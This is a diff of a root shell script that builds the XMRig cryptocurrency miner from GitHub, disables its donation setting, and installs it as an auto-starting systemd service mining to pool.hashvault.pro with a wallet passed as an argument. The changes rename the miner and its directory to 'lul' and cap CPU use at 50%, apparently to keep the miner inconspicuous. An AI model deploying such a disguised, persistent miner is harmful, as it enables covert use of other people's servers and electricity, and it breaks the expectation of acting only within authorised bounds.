@@ -2,17 +2,17 @@
 apt update
 apt upgrade -y
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
-git clone https://github.com/xmrig/xmrig.git
-mkdir xmrig/build && cd xmrig/build
+git clone https://github.com/xmrig/xmrig.git lul
+mkdir lul/build && cd lul/build
 perl -pi -e 's/1/0/g' ../src/donate.h
 cmake ..
 make -j$(nproc)
-cd /etc/systemd/system
+mv xmrig lul
 echo "[Install]
 WantedBy=multi-user.target
 [Service]
-ExecStart=/root/xmrig/build/xmrig" > xmrig.service
-cd /root/xmrig/build
+CPUQuota=50%
+ExecStart=/root/lul/build/lul" > /etc/systemd/system/lul.service
 echo "{
   \"api\": {
     \"id\": null,
@@ -68,8 +68,8 @@ echo "{
       \"algo\": null,
       \"coin\": null,
       \"url\": \"pool.hashvault.pro:80\",
-      \"user\": \"TRTLv2nb9jn7e6EGsTrLfAWWFfH8nTNVgeckVHDkBHqHJ7ihwSzTULPLYfgLHx2wYbUCSmPYWcB9Wgh12n7BMkF6DuqrLYNbrDC\",
-      \"pass\": \"x\",
+      \"user\": \"$1\",
+      \"pass\": \"$2\",
       \"rig-id\": null,
       \"nicehash\": false,
       \"keepalive\": false,
@@ -87,6 +87,6 @@ echo "{
   \"syslog\": false,
   \"user-agent\": null,
   \"watch\": true
-}" > config.json
-systemctl start xmrig.service
-systemctl enable xmrig.service
+}" > /root/lul/build/config.json
+systemctl start lul.service
+systemctl enable lul.service
